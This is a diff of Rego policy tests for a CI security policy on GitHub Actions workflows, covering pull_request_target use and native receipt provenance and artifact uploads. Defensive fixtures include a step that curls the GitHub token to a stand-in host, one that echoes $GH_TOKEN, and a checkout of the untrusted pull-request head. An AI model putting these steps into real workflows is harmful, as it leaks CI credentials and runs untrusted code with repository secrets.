@@ -110,6 +110,71 @@ test_allows_digest_pinned_workflow_images if {
 	count(violations) == 0
 }
 
+test_rejects_generic_pull_request_target_workflow if {
+	workflow := object.union(workflow_with_live_run("echo safe"), {"on": "pull_request_target"})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
+test_allows_exact_native_receipt_provenance_workflow if {
+	violations := deny with input as native_receipt_provenance_fixture
+	count(violations) == 0
+}
+
+test_rejects_native_receipt_provenance_with_canceling_concurrency if {
+	workflow := object.union(native_receipt_provenance_fixture, {"concurrency": {"group": "native-chainguard-receipt-provenance", "cancel-in-progress": true}})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
+test_rejects_native_receipt_provenance_with_write_permission if {
+	base := native_receipt_provenance_fixture
+	workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {
+		"permissions": {"actions": "read", "contents": "write"},
+	})}})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
+test_rejects_native_receipt_provenance_with_changed_verifier_step if {
+	base := native_receipt_provenance_fixture
+	steps := [
+		base.jobs.verify.steps[0],
+		object.union(base.jobs.verify.steps[1], {"run": "echo \"$GH_TOKEN\""}),
+	]
+	workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {"steps": steps})}})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
+test_rejects_native_receipt_provenance_with_extra_step if {
+	base := native_receipt_provenance_fixture
+	steps := array.concat(base.jobs.verify.steps, [{"run": "curl --data '${{ github.token }}' https://example.invalid"}])
+	workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {"steps": steps})}})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
+test_rejects_native_receipt_provenance_with_head_checkout if {
+	base := native_receipt_provenance_fixture
+	checkout := object.union(base.jobs.verify.steps[0], {"with": object.union(
+		base.jobs.verify.steps[0].with,
+		{"ref": "${{ github.event.pull_request.head.sha }}"},
+	)})
+	workflow := object.union(base, {"jobs": {"verify": object.union(
+		base.jobs.verify,
+		{"steps": [checkout, base.jobs.verify.steps[1]]},
+	)}})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
 test_rejects_public_live_command_output if {
 	violations := deny with input as workflow_with_live_run("bash scripts/ci/install-kubeconfig.sh")
 	some msg in violations
@@ -575,6 +640,31 @@ test_rejects_live_job_artifact_upload if {
 	}
 }
 
+test_allows_exact_native_receipt_artifact if {
+	violations := deny with input as workflow_with_native_receipt_artifact(native_receipt_artifact_fixture)
+	count(violations) == 0
+}
+
+test_rejects_modified_native_receipt_artifact if {
+	options := object.union(object.get(native_receipt_artifact_fixture, "with", {}), {
+		"path": "${{ runner.temp }}/other.json",
+	})
+	artifact := object.union(native_receipt_artifact_fixture, {"with": options})
+	violations := deny with input as workflow_with_native_receipt_artifact(artifact)
+	some msg in violations
+	contains(msg, "must not upload artifacts")
+}
+
+test_rejects_intervening_native_receipt_step if {
+	workflow := workflow_with_native_receipt_artifact(native_receipt_artifact_fixture)
+	job := workflow.jobs.receipt
+	steps := [job.steps[0], {"run": "echo unsafe > $RUNNER_TEMP/harbor-native-chainguard-receipt.json"}, job.steps[1]]
+	changed := object.union(workflow, {"jobs": {"receipt": object.union(job, {"steps": steps})}})
+	violations := deny with input as changed
+	some msg in violations
+	contains(msg, "must not upload artifacts")
+}
+
 test_allows_withheld_live_command_output if {
 	violations := deny with input as workflow_with_live_run(withheld_live_run)
 	count(violations) == 0
@@ -667,6 +757,17 @@ workflow_with_images(docker_action, job_container, service_image) := {
 	}},
 }
 
+native_receipt_provenance_fixture := {
+	"name": "Verify Native Chainguard Receipt Provenance",
+	"concurrency": {"group": "native-chainguard-receipt-provenance", "cancel-in-progress": false},
+	"true": {
+		"push": {"branches": ["main"]},
+		"pull_request_target": {"branches": ["main"], "types": ["opened", "reopened", "synchronize", "edited"]},
+	},
+	"permissions": {},
+	"jobs": {"verify": native_receipt_provenance_job},
+}
+
 workflow_with_live_run(run) := {
 	"name": "Live output test",
 	"on": "workflow_dispatch",
@@ -719,6 +820,33 @@ test_encrypted_harbor_artifact_exception_is_exact if {
 		some msg in denials
 		contains(msg, "must not upload artifacts")
 	}
+}
+
+native_receipt_artifact_fixture := {
+	"name": "Upload Native Receipt",
+	"uses": "chainguard-actions/actions-upload-artifact@ebf8f2543b7189e9a67dcac1af8cabbc5d7a3fd6",
+	"with": {
+		"name": "harbor-native-chainguard-receipt-${{ github.sha }}",
+		"path": "${{ runner.temp }}/harbor-native-chainguard-receipt.json",
+		"if-no-files-found": "error",
+		"retention-days": 30,
+		"include-hidden-files": false,
+	},
+}
+
+workflow_with_native_receipt_artifact(artifact) := {
+	"name": "Verify Native Chainguard Harbor Imports",
+	"on": "workflow_dispatch",
+	"permissions": {},
+	"env": {"KUBE_API_SERVER_URL": "https://kubernetes-api-ci.stinkyboi.com"},
+	"jobs": {"receipt": {
+		"runs-on": "ubuntu-24.04",
+		"permissions": {"contents": "read", "id-token": "write"},
+		"steps": [
+			{"run": native_receipt_private_run, "env": {"OCTELIUM_AUTH_TOKEN": "test"}},
+			artifact,
+		],
+	}},
 }
 
 test_encrypted_oce_image_artifact_exception_is_exact if {
